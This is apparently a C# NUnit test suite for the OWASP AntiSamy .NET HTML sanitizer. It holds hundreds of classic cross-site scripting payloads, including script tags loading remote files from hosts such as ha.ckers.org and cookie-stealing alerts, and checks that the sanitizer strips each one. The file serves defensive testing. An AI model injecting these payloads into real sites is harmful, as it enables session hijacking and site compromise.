/*
* Copyright (c) 2009, Jerry Hoff
* 
* All rights reserved.
* 
* Redistribution and use in source and binary forms, with or without modification, are permitted provided that the following conditions are met:
* 
* Redistributions of source code must retain the above copyright notice, this list of conditions and the following disclaimer.
* Redistributions in binary form must reproduce the above copyright notice, this list of conditions and the following disclaimer in the documentation and/or other materials provided with the distribution.
* Neither the name of OWASP nor the names of its contributors  may be used to endorse or promote products derived from this software without specific prior written permission.
*
* THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS
* "AS IS" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT
* LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR
* A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT OWNER OR
* CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL,
* EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO,
* PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR
* PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF
* LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING
* NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS
* SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
*/

using System;
using System.Collections.Generic;
using System.Text;
using NUnit.Framework;
using NUnit.Core;
using System.IO;
using org.owasp.validator.html;
using org.owasp.validator.html.scan;
using org.owasp.validator.html.util;
using org.owasp.validator.html.model;

namespace org.owasp.validator.html.test
{
    [TestFixture]
    public class AntiSamyTest
    {
        AntiSamy antisamy = new AntiSamy();
        Policy policy = null;
        string filename = @"../../resources/antisamy.xml";

        [SetUp]
        public void SetUp()
        {
            policy = Policy.getInstance(filename);
        }

        /*
         * Test basic XSS cases. 
         */
        [Test]
        public void testScriptAttacks()
        {
            try
            {
                Assert.IsTrue(antisamy.scan("test<script>alert(document.cookie)</script>", policy).getCleanHTML().IndexOf("script") == -1);
                Assert.IsTrue(antisamy.scan("<<<><<script src=http://fake-evil.ru/test.js>", policy).getCleanHTML().IndexOf("<script") == -1);
                Assert.IsTrue(antisamy.scan("<script<script src=http://fake-evil.ru/test.js>>", policy).getCleanHTML().IndexOf("<script") == -1);
                Assert.IsTrue(antisamy.scan("<SCRIPT/XSS SRC=\"http://ha.ckers.org/xss.js\"></SCRIPT>", policy).getCleanHTML().IndexOf("<script") == -1);
                Assert.IsTrue(antisamy.scan("<BODY onload!#$%&()*~+-_.,:;?@[/|\\]^`=alert(\"XSS\")>", policy).getCleanHTML().IndexOf("onload") == -1);
                Assert.IsTrue(antisamy.scan("<BODY ONLOAD=alert('XSS')>", policy).getCleanHTML().IndexOf("alert") == -1);
                Assert.IsTrue(antisamy.scan("<iframe src=http://ha.ckers.org/scriptlet.html <", policy).getCleanHTML().IndexOf("<iframe") == -1);
                Assert.IsTrue(antisamy.scan("<INPUT TYPE=\"IMAGE\" SRC=\"javascript:alert('XSS');\">", policy).getCleanHTML().IndexOf("src") == -1);
            }
            catch (Exception e)
            {
                Assert.Fail("Caught exception in testScriptAttack(): " + e.Message);
            }
        }

        [Test]
        public void testImgAttacks()
        {
            try
            {
                Assert.IsTrue(antisamy.scan("<img src='http://www.myspace.com/img.gif'>", policy).getCleanHTML().IndexOf("<img") != -1);
                Assert.IsTrue(antisamy.scan("<img src=javascript:alert(document.cookie)>", policy).getCleanHTML().IndexOf("<img") == -1);
                Assert.IsTrue(antisamy.scan("<IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>", policy).getCleanHTML().IndexOf("<img") == -1);       
                Assert.IsTrue(antisamy.scan("<IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041>", policy).getCleanHTML().IndexOf("&amp;") != -1);
                Assert.IsTrue(antisamy.scan("<IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>", policy).getCleanHTML().IndexOf("&amp;") != -1);
                Assert.IsTrue(antisamy.scan("<IMG SRC=\"jav&#x0D;ascript:alert('XSS');\">", policy).getCleanHTML().IndexOf("alert") == -1);
                Assert.IsTrue(antisamy.scan("<IMG SRC=\"javascript:alert('XSS')\"", policy).getCleanHTML().IndexOf("javascript") == -1);
                Assert.IsTrue(antisamy.scan("<IMG LOWSRC=\"javascript:alert('XSS')\">", policy).getCleanHTML().IndexOf("javascript") == -1);
                Assert.IsTrue(antisamy.scan("<BGSOUND SRC=\"javascript:alert('XSS');\">", policy).getCleanHTML().IndexOf("javascript") == -1);
            }
            catch (Exception e)
            {
                Assert.Fail("Caught exception in testImgSrcAttacks(): " + e.Message);
            }
        }

        [Test]
        public void testHrefAttacks()
        {
            try
            {
                Assert.IsTrue(antisamy.scan("<LINK REL=\"stylesheet\" HREF=\"javascript:alert('XSS');\">", policy).getCleanHTML().IndexOf("href") == -1);
                Assert.IsTrue(antisamy.scan("<LINK REL=\"stylesheet\" HREF=\"http://ha.ckers.org/xss.css\">", policy).getCleanHTML().IndexOf("href") == -1);
                Assert.IsTrue(antisamy.scan("<STYLE>@import'http://ha.ckers.org/xss.css';</STYLE>", policy).getCleanHTML().IndexOf("ha.ckers.org") == -1);
                Assert.IsTrue(antisamy.scan("<STYLE>BODY{-moz-binding:url(\"http://ha.ckers.org/xssmoz.xml#xss\")}</STYLE>", policy).getCleanHTML().IndexOf("ha.ckers.org") == -1);
                Assert.IsTrue(antisamy.scan("<STYLE>BODY{-moz-binding:url(\"http://ha.ckers.org/xssmoz.xml#xss\")}</STYLE>", policy).getCleanHTML().IndexOf("xss.htc") == -1);
                Assert.IsTrue(antisamy.scan("<STYLE>li {list-style-image: url(\"javascript:alert('XSS')\");}</STYLE><UL><LI>XSS", policy).getCleanHTML().IndexOf("javascript") == -1);
                Assert.IsTrue(antisamy.scan("<IMG SRC='vbscript:msgbox(\"XSS\")'>", policy).getCleanHTML().IndexOf("vbscript") == -1);
                Assert.IsTrue(antisamy.scan("<META HTTP-EQUIV=\"refresh\" CONTENT=\"0; URL=http://;URL=javascript:alert('XSS');\">", policy).getCleanHTML().IndexOf("<meta") == -1);
                Assert.IsTrue(antisamy.scan("<META HTTP-EQUIV=\"refresh\" CONTENT=\"0;url=javascript:alert('XSS');\">", policy).getCleanHTML().IndexOf("<meta") == -1);
                Assert.IsTrue(antisamy.scan("<META HTTP-EQUIV=\"refresh\" CONTENT=\"0;url=data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K\">", policy).getCleanHTML().IndexOf("<meta") == -1);
                Assert.IsTrue(antisamy.scan("<IFRAME SRC=\"javascript:alert('XSS');\"></IFRAME>", policy).getCleanHTML().IndexOf("iframe") == -1);
                Assert.IsTrue(antisamy.scan("<FRAMESET><FRAME SRC=\"javascript:alert('XSS');\"></FRAMESET>", policy).getCleanHTML().IndexOf("javascript") == -1);
                Assert.IsTrue(antisamy.scan("<TABLE BACKGROUND=\"javascript:alert('XSS')\">", policy).getCleanHTML().IndexOf("background") == -1);
                Assert.IsTrue(antisamy.scan("<TABLE><TD BACKGROUND=\"javascript:alert('XSS')\">", policy).getCleanHTML().IndexOf("background") == -1);
                Assert.IsTrue(antisamy.scan("<DIV STYLE=\"background-image: url(javascript:alert('XSS'))\">", policy).getCleanHTML().IndexOf("javascript") == -1);
                Assert.IsTrue(antisamy.scan("<DIV STYLE=\"width: expression(alert('XSS'));\">", policy).getCleanHTML().IndexOf("alert") == -1);
                Assert.IsTrue(antisamy.scan("<IMG STYLE=\"xss:expr/*XSS*/ession(alert('XSS'))\">", policy).getCleanHTML().IndexOf("alert") == -1);
                Assert.IsTrue(antisamy.scan("<STYLE>@im\\port'\\ja\\vasc\\ript:alert(\"XSS\")';</STYLE>", policy).getCleanHTML().IndexOf("ript:alert") == -1);
                Assert.IsTrue(antisamy.scan("<BASE HREF=\"javascript:alert('XSS');//\">", policy).getCleanHTML().IndexOf("javascript") == -1);
                Assert.IsTrue(antisamy.scan("<BaSe hReF=\"http://arbitrary.com/\">", policy).getCleanHTML().IndexOf("<base") == -1);
                Assert.IsTrue(antisamy.scan("<OBJECT TYPE=\"text/x-scriptlet\" DATA=\"http://ha.ckers.org/scriptlet.html\"></OBJECT>", policy).getCleanHTML().IndexOf("<object") == -1);
                Assert.IsTrue(antisamy.scan("<OBJECT classid=clsid:ae24fdae-03c6-11d1-8b76-0080c744f389><param name=url value=javascript:alert('XSS')></OBJECT>", policy).getCleanHTML().IndexOf("<object") == -1);
                Assert.IsTrue(antisamy.scan("<EMBED SRC=\"http://ha.ckers.org/xss.swf\" AllowScriptAccess=\"always\"></EMBED>", policy).getCleanHTML().IndexOf("<embed") == -1);
                Assert.IsTrue(antisamy.scan("<EMBED SRC=\"data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh TUyIpOzwvc2NyaXB0Pjwvc3ZnPg==\" type=\"image/svg+xml\" AllowScriptAccess=\"always\"></EMBED>", policy).getCleanHTML().IndexOf("<embed") == -1);
                Assert.IsTrue(antisamy.scan("<SCRIPT a=\">\" SRC=\"http://ha.ckers.org/xss.js\"></SCRIPT>", policy).getCleanHTML().IndexOf("<script") == -1);
                Assert.IsTrue(antisamy.scan("<SCRIPT a=\">\" '' SRC=\"http://ha.ckers.org/xss.js\"></SCRIPT>", policy).getCleanHTML().IndexOf("<script") == -1);
                Assert.IsTrue(antisamy.scan("<SCRIPT a=`>` SRC=\"http://ha.ckers.org/xss.js\"></SCRIPT>", policy).getCleanHTML().IndexOf("<script") == -1);
                Assert.IsTrue(antisamy.scan("<SCRIPT a=\">'>\" SRC=\"http://ha.ckers.org/xss.js\"></SCRIPT>", policy).getCleanHTML().IndexOf("<script") == -1);
                Assert.IsTrue(antisamy.scan("<SCRIPT>document.write(\"<SCRI\");</SCRIPT>PT SRC=\"http://ha.ckers.org/xss.js\"></SCRIPT>", policy).getCleanHTML().IndexOf("script") == -1);
                Assert.IsTrue(antisamy.scan("<SCRIPT SRC=http://ha.ckers.org/xss.js", policy).getCleanHTML().IndexOf("<script") == -1);
                Assert.IsTrue(antisamy.scan("<div/style=&#92&#45&#92&#109&#111&#92&#122&#92&#45&#98&#92&#105&#92&#110&#100&#92&#105&#110&#92&#103:&#92&#117&#114&#108&#40&#47&#47&#98&#117&#115&#105&#110&#101&#115&#115&#92&#105&#92&#110&#102&#111&#46&#99&#111&#46&#117&#107&#92&#47&#108&#97&#98&#115&#92&#47&#120&#98&#108&#92&#47&#120&#98&#108&#92&#46&#120&#109&#108&#92&#35&#120&#115&#115&#41&>", policy).getCleanHTML().IndexOf("style") == -1);
                Assert.IsTrue(antisamy.scan("<a href='aim: &c:\\windows\\system32\\calc.exe' ini='C:\\Documents and Settings\\All Users\\Start Menu\\Programs\\Startup\\pwnd.bat'>", policy).getCleanHTML().IndexOf("aim.exe") == -1);
                Assert.IsTrue(antisamy.scan("<!--\n<A href=\n- --><a href=javascript:alert:document.domain>test-->", policy).getCleanHTML().IndexOf("javascript") == -1);
                Assert.IsTrue(antisamy.scan("<a></a style=\"\"xx:expr/**/ession(document.appendChild(document.createElement('script')).src='http://h4k.in/i.js')\">", policy).getCleanHTML().IndexOf("document") == -1);
            }
            catch (Exception e)
            {
                Assert.Fail("Caught exception in testHrefSrcAttacks(): " + e.Message);
            }
        }

        /*
         * Test CSS protections. 
         */
        [Test]
        public void testCssAttacks()
        {
            try
            {
                Assert.IsTrue(antisamy.scan("<div style=\"position:absolute\">", policy).getCleanHTML().IndexOf("position") == -1);
                Assert.IsTrue(antisamy.scan("<style>b { position:absolute }</style>", policy).getCleanHTML().IndexOf("position") == -1);
                Assert.IsTrue(antisamy.scan("<div style=\"z-index:25\">", policy).getCleanHTML().IndexOf("position") == -1);
                Assert.IsTrue(antisamy.scan("<style>z-index:25</style>", policy).getCleanHTML().IndexOf("position") == -1);
            }
            catch (Exception e)
            {
                Assert.Fail("Caught exception in testCssAttacks(): " + e.Message);
            }
        }

        [TestCase(@"One", @"One")]
        [TestCase(@"<a href=""www.google.com"">Click Here!</a>", @"<a href=""www.google.com"">Click Here!</a>")]
        [TestCase(@"<table><tr><td>Sweet</td></tr></table>", @"<table><tr><td>Sweet</td></tr></table>")]
        [TestCase(@"<weird>Stuff</weird>", @"Stuff")]
        [TestCase(@"<script>Stuff</script>", @"")]
        [TestCase(@"<p>Stuff</p>", @"<p>Stuff</p>")]
        [TestCase(@"<span>Stuff</span>", @"<span>Stuff</span>")]
        [TestCase(@"<div>Stuff</div>", @"<div>Stuff</div>")]
        [TestCase(@"<span>Stuff", @"<span>Stuff</span>")]
        [TestCase(@"<b>Stuff</b>", @"<b>Stuff</b>")]
        [TestCase(@"<br><br />", @"<br /><br />")]
        [TestCase(@"<a href=""javascript:alert('hello!')"">Click here</a>", @"<a>Click here</a>")]
        [TestCase(@"this is some <blink>blinking</blink> text", @"this is some blinking text")]
        //[TestCase(@"';alert(String.fromCharCode(88,83,83))//\';alert(String.fromCharCode(88,83,83))//"";alert(String.fromCharCode(88,83,83))//\"";alert(String.fromCharCode(88,83,83))//--></SCRIPT>"">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>", @"")]
        [TestCase(@"'';!--""<XSS>=&{()}""", @"'';!--&quot;=&amp;{()}&quot;")]
        [TestCase(@"<SCRIPT SRC=http://ha.ckers.org/xss.js></SCRIPT>", @"")]
        [TestCase(@"<IMG SRC=""javascript:alert('XSS');"">", @"")]
        [TestCase(@"<IMG SRC=javascript:alert('XSS')>", @"")]
        [TestCase(@"<IMG SRC=JaVaScRiPt:alert('XSS')>", @"")]
        [TestCase(@"<IMG SRC=javascript:alert(&quot;XSS&quot;)>", @"")]
        [TestCase(@"<IMG SRC=`javascript:alert(""RSnake says, 'XSS'"")`>", @"")]
        [TestCase(@"<IMG """"""><SCRIPT>alert(""XSS"")</SCRIPT>"">", @"<img />&quot;&gt;")]
        [TestCase(@"<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>", @"")]
        [TestCase(@"<IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>", @"")]
        [TestCase(@"<IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041>", @"<img src=""&amp;#0000106&amp;#0000097&amp;#0000118&amp;#0000097&amp;#0000115&amp;#0000099&amp;#0000114&amp;#0000105&amp;#0000112&amp;#0000116&amp;#0000058&amp;#0000097&amp;#0000108&amp;#0000101&amp;#0000114&amp;#0000116&amp;#0000040&amp;#0000039&amp;#0000088&amp;#0000083&amp;#0000083&amp;#0000039&amp;#0000041"" />")]
        [TestCase(@"<IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>", @"<img src=""&amp;#x6A&amp;#x61&amp;#x76&amp;#x61&amp;#x73&amp;#x63&amp;#x72&amp;#x69&amp;#x70&amp;#x74&amp;#x3A&amp;#x61&amp;#x6C&amp;#x65&amp;#x72&amp;#x74&amp;#x28&amp;#x27&amp;#x58&amp;#x53&amp;#x53&amp;#x27&amp;#x29"" />")]
        [TestCase(@"<IMG SRC=""jav	ascript:alert('XSS');"">", @"")]
        [TestCase(@"<IMG SRC=""jav&#x09;ascript:alert('XSS');"">", @"")]
        [TestCase(@"<IMG SRC=""jav&#x0A;ascript:alert('XSS');"">", @"")]
        [TestCase(@"<IMG SRC=""jav&#x0D;ascript:alert('XSS');"">", @"")]
        [TestCase(@"<IMG
SRC
=
""
j
a
v
a
s
c
r
i
p
t
:
a
l
e
r
t
(
'
X
S
S
'
)
""
>
", @"
")]
        [TestCase(@"<IMG SRC="" &#14;  javascript:alert('XSS');"">", @"")]
        [TestCase(@"<SCRIPT/XSS SRC=""http://ha.ckers.org/xss.js""></SCRIPT>", @"")]
        [TestCase(@"<BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=alert(""XSS"")>", @"<body></body>")]
        [TestCase(@"<SCRIPT/SRC=""http://ha.ckers.org/xss.js""></SCRIPT>", @"")]
        [TestCase(@"<<SCRIPT>alert(""XSS"");//<</SCRIPT>", @"")]
        [TestCase(@"<SCRIPT SRC=http://ha.ckers.org/xss.js?<B>", @"")]
        [TestCase(@"<SCRIPT SRC=//ha.ckers.org/.j>", @"")]
        [TestCase(@"<IMG SRC=""javascript:alert('XSS')""", @"")]
        [TestCase(@"<iframe src=http://ha.ckers.org/scriptlet.html <", @"")]
        [TestCase(@"<SCRIPT>a=/XSS/
//alert(a.source)</SCRIPT>", @"")]
        [TestCase(@"</TITLE><SCRIPT>alert(""XSS"");</SCRIPT>", @"")]
        [TestCase(@"<INPUT TYPE=""IMAGE"" SRC=""javascript:alert('XSS');"">", @"<input type=""IMAGE"" />")]
        [TestCase(@"<BODY BACKGROUND=""javascript:alert('XSS')"">", @"<body></body>")]
        [TestCase(@"<BODY ONLOAD=alert('XSS')>", @"<body></body>")]
        [TestCase(@"<IMG DYNSRC=""javascript:alert('XSS')"">", @"<img />")]
        [TestCase(@"<IMG LOWSRC=""javascript:alert('XSS')"">", @"<img />")]
        [TestCase(@"<BGSOUND SRC=""javascript:alert('XSS');"">", @"")]
        [TestCase(@"<BR SIZE=""&{alert('XSS')}"">", @"<br />")]
        [TestCase(@"<LAYER SRC=""http://ha.ckers.org/scriptlet.html""></LAYER>", @"")]
        [TestCase(@"<LINK REL=""stylesheet"" HREF=""javascript:alert('XSS');"">", @"<link rel=""stylesheet"" />")]
        [TestCase(@"<LINK REL=""stylesheet"" HREF=""http://ha.ckers.org/xss.css"">", @"<link rel=""stylesheet"" />")]
        [TestCase(@"<STYLE>@import'http://ha.ckers.org/xss.css';</STYLE>", @"<style>
//<![CDATA[
/* */
//]]>//
</style>")] //bizzarre but safe
        [TestCase(@"<META HTTP-EQUIV=""Link"" Content=""<http://ha.ckers.org/xss.css>; REL=stylesheet"">", @"")]
        [TestCase(@"<STYLE>BODY{-moz-binding:url(""http://ha.ckers.org/xssmoz.xml#xss"")}</STYLE>", "<style>\r\n//<![CDATA[\r\nBODY {\n}\n\r\n//]]>//\r\n</style>")]
        [TestCase(@"<XSS STYLE=""behavior: url(xss.htc);"">", @"")]
        [TestCase(@"<STYLE>li {list-style-image: url(""javascript:alert('XSS')"");}</STYLE><UL><LI>XSS", "<style>\r\n//<![CDATA[\r\nli {\n}\n\r\n//]]>//\r\n</style><ul><li>XSS</li></ul>")]
        [TestCase(@"<IMG SRC='vbscript:msgbox(""XSS"")'>", @"")]
        [TestCase(@"<IMG SRC=""mocha:[code]"">", @"")]
        [TestCase(@"<IMG SRC=""livescript:[code]"">", @"")]
        [TestCase(@"<META HTTP-EQUIV=""refresh"" CONTENT=""0;url=javascript:alert('XSS');"">", @"")]
        [TestCase(@"<META HTTP-EQUIV=""refresh"" CONTENT=""0;url=data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K"">", @"")]
        [TestCase(@"<META HTTP-EQUIV=""refresh"" CONTENT=""0; URL=http://;URL=javascript:alert('XSS');"">", @"")]
        [TestCase(@"<IFRAME SRC=""javascript:alert('XSS');""></IFRAME>", @"")]
        [TestCase(@"<FRAMESET><FRAME SRC=""javascript:alert('XSS');""></FRAMESET>", @"")]
        [TestCase(@"<TABLE BACKGROUND=""javascript:alert('XSS')"">", @"<table></table>")]
        [TestCase(@"<TABLE><TD BACKGROUND=""javascript:alert('XSS')"">", @"<table><td></td></table>")]
        [TestCase(@"<DIV STYLE=""background-image: url(javascript:alert('XSS'))"">", @"<div style=""""></div>")]
        [TestCase(@"<DIV STYLE=""background-image:\0075\0072\006C\0028'\006a\0061\0076\0061\0073\0063\0072\0069\0070\0074\003a\0061\006c\0065\0072\0074\0028.1027\0058.1053\0053\0027\0029'\0029"">", @"<div style=""""></div>")]
        [TestCase(@"<DIV STYLE=""background-image: url(&#1;javascript:alert('XSS'))"">", @"<div style=""""></div>")]
        [TestCase(@"<DIV STYLE=""width: expression(alert('XSS'));"">", @"<div style=""""></div>")]
        [TestCase(@"<STYLE>@im\port'\ja\vasc\ript:alert(""XSS"")';</STYLE>", @"<style>
//<![CDATA[
/* */
//]]>//
</style>")]
        [TestCase(@"<IMG STYLE=""xss:expr/*XSS*/ession(alert('XSS'))"">", @"<img style="""" />")]
        [TestCase(@"<XSS STYLE=""xss:expression(alert('XSS'))"">", @"")]
        [TestCase(@"exp/*<A STYLE='no\xss:noxss(""*//*"");
xss:&#101;x&#x2F;*XSS*//*/*/pression(alert(""XSS""))'>", @"exp/*<a style=''></a>")]
        [TestCase(@"<STYLE TYPE=""text/javascript"">alert('XSS');</STYLE>", @"<style>
//<![CDATA[
/* */
//]]>//
</style>")]
        [TestCase(@"<STYLE>.XSS{background-image:url(""javascript:alert('XSS')"");}</STYLE><A CLASS=XSS></A>", @"<style>
//<![CDATA[
/* */
//]]>//
</style><a class=""XSS""></a>")]
        [TestCase(@"<STYLE type=""text/css"">BODY{background:url(""javascript:alert('XSS')"")}</STYLE>", "<style type=\"text/css\">\r\n//<![CDATA[\r\nBODY {\n}\n\r\n//]]>//\r\n</style>")]
        [TestCase(@"<!--[if gte IE 4]>
<SCRIPT>alert('XSS');</SCRIPT>
<![endif]-->", @"")]
        [TestCase(@"<BASE HREF=""javascript:alert('XSS');//"">", @"")]
        [TestCase(@"<OBJECT TYPE=""text/x-scriptlet"" DATA=""http://ha.ckers.org/scriptlet.html""></OBJECT>", @"")]
        [TestCase(@"<OBJECT classid=clsid:ae24fdae-03c6-11d1-8b76-0080c744f389><param name=url value=javascript:alert('XSS')></OBJECT>", @"")]
        [TestCase(@"<EMBED SRC=""http://ha.ckers.org/xss.swf"" AllowScriptAccess=""always""></EMBED>", @"")]
        [TestCase(@"<EMBED SRC=""data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh TUyIpOzwvc2NyaXB0Pjwvc3ZnPg=="" type=""image/svg+xml"" AllowScriptAccess=""always""></EMBED>", @"")]
        [TestCase(@"<HTML xmlns:xss>
  <?import namespace=""xss"" implementation=""http://ha.ckers.org/xss.htc"">
  <xss:xss>XSS</xss:xss>
</HTML>", @"<html>
  
  XSS
</html>")]
        [TestCase(@"<XML ID=I><X><C><![CDATA[<IMG SRC=""javas]]><![CDATA[cript:alert('XSS');"">]]>
</C></X></xml><SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML></SPAN>", @"]]&gt;
<span></span>")]
        [TestCase(@"<XML ID=""xss""><I><B>&lt;IMG SRC=""javas<!-- -->cript:alert('XSS')""&gt;</B></I></XML>
        <SPAN DATASRC=""#xss"" DATAFLD=""B"" DATAFORMATAS=""HTML""></SPAN>", @"<i><b>&lt;IMG SRC=&quot;javascript:alert('XSS')&quot;&gt;</b></i>
        <span></span>")]
        [TestCase(@"<XML SRC=""xsstest.xml"" ID=I></XML>
<SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML></SPAN>", @"
<span></span>")]
        [TestCase(@"<HTML><BODY>
<?xml:namespace prefix=""t"" ns=""urn:schemas-microsoft-com:time"">
<?import namespace=""t"" implementation=""#default#time2"">
<t:set attributeName=""innerHTML"" to=""XSS&lt;SCRIPT DEFER&gt;alert(&quot;XSS&quot;)&lt;/SCRIPT&gt;"">
</BODY></HTML>", @"<html><body>



</body></html>")]
        [TestCase(@"<SCRIPT SRC=""http://ha.ckers.org/xss.jpg""></SCRIPT>", @"")]
        [TestCase(@"<!--#exec cmd=""/bin/echo '<SCR'""--><!--#exec cmd=""/bin/echo 'IPT SRC=http://ha.ckers.org/xss.js></SCRIPT>'""-->", @"")]
        [TestCase(@"<? echo('<SCR)';
echo('IPT>alert(""XSS"")</SCRIPT>'); ?>", @"alert(&quot;XSS&quot;)'); ?&gt;")]
        [TestCase(@"<META HTTP-EQUIV=""Set-Cookie"" Content=""USERID=&lt;SCRIPT&gt;alert('XSS')&lt;/SCRIPT&gt;"">", @"")]
        [TestCase(@"<SCRIPT a="">"" SRC=""http://ha.ckers.org/xss.js""></SCRIPT>", @"")]
        [TestCase(@"<SCRIPT ="">"" SRC=""http://ha.ckers.org/xss.js""></SCRIPT>", @"")]
        [TestCase(@"<SCRIPT a="">"" '' SRC=""http://ha.ckers.org/xss.js""></SCRIPT>", @"")]
        [TestCase(@"<SCRIPT ""a='>'"" SRC=""http://ha.ckers.org/xss.js""></SCRIPT>", @"")]
        [TestCase(@"<SCRIPT a=`>` SRC=""http://ha.ckers.org/xss.js""></SCRIPT>", @"")]
        [TestCase(@"<SCRIPT a="">'>"" SRC=""http://ha.ckers.org/xss.js""></SCRIPT>", @"")]
        [TestCase(@"<SCRIPT>document.write(""<SCRI"");</SCRIPT>PT SRC=""http://ha.ckers.org/xss.js""></SCRIPT>", @"PT SRC=&quot;http://ha.ckers.org/xss.js&quot;&gt;")]
        [TestCase(@"<body FSCommand=alert('XSS')>", @"<body></body>")]
        [TestCase(@"<body onAbort=alert('XSS')>", @"<body></body>")]
        [TestCase(@"<body onActivate=alert('XSS')>", @"<body></body>")]
        [TestCase(@"<body onAfterPrint=alert('XSS')>", @"<body></body>")]
        [TestCase(@"<body onAfterUpdate=alert('XSS')>", @"<body></body>")]
        [TestCase(@"<body onBeforeActivate=alert('XSS')>", @"<body></body>")]
        [TestCase(@"<body onBeforeCopy=alert('XSS')>", @"<body></body>")]
        [TestCase(@"<body onBeforeCut=alert('XSS')>", @"<body></body>")]
        [TestCase(@"<body onBeforeDeactivate=alert('XSS')>", @"<body></body>")]
        [TestCase(@"<body onBeforeEditFocus=alert('XSS')>", @"<body></body>")]
        [TestCase(@"<body onBeforePaste=alert('XSS')>", @"<body></body>")]
        [TestCase(@"<body onBeforePrint=alert('XSS')>", @"<body></body>")]
        [TestCase(@"<body onBeforeUnload=alert('XSS')>", @"<body></body>")]
        [TestCase(@"<body onBegin=alert('XSS')>", @"<body></body>")]
        [TestCase(@"<body onBlur=alert('XSS')>", @"<body></body>")]
        [TestCase(@"<body onBounce=alert('XSS')>", @"<body></body>")]
        [TestCase(@"<body onCellChange=alert('XSS')>", @"<body></body>")]
        [TestCase(@"<body onChange=alert('XSS')>", @"<body></body>")]
        [TestCase(@"<body onClick=alert('XSS')>", @"<body></body>")]
        [TestCase(@"<body onContextMenu=alert('XSS')>", @"<body></body>")]
        [TestCase(@"<body onControlSelect=alert('XSS')>", @"<body></body>")]
        [TestCase(@"<body onCopy=alert('XSS')>", @"<body></body>")]
        [TestCase(@"<body onCut=alert('XSS')>", @"<body></body>")]
        [TestCase(@"<body onDataAvailable=alert('XSS')>", @"<body></body>")]
        [TestCase(@"<body onDataSetChanged=alert('XSS')>", @"<body></body>")]
        [TestCase(@"<body onDataSetComplete=alert('XSS')>", @"<body></body>")]
        [TestCase(@"<body onDblClick=alert('XSS')>", @"<body></body>")]
        [TestCase(@"<body onDeactivate=alert('XSS')>", @"<body></body>")]
        [TestCase(@"<body onDrag=alert('XSS')>", @"<body></body>")]
        [TestCase(@"<body onDragEnd=alert('XSS')>", @"<body></body>")]
        [TestCase(@"<body onDragLeave=alert('XSS')>", @"<body></body>")]
        [TestCase(@"<body onDragEnter=alert('XSS')>", @"<body></body>")]
        [TestCase(@"<body onDragOver=alert('XSS')>", @"<body></body>")]
        [TestCase(@"<body onDragDrop=alert('XSS')>", @"<body></body>")]
        [TestCase(@"<body onDrop=alert('XSS')>", @"<body></body>")]
        [TestCase(@"<body onEnd=alert('XSS')>", @"<body></body>")]
        [TestCase(@"<body onError=alert('XSS')>", @"<body></body>")]
        [TestCase(@"<body onErrorUpdate=alert('XSS')>", @"<body></body>")]
        [TestCase(@"<body onFilterChange=alert('XSS')>", @"<body></body>")]
        [TestCase(@"<body onFinish=alert('XSS')>", @"<body></body>")]
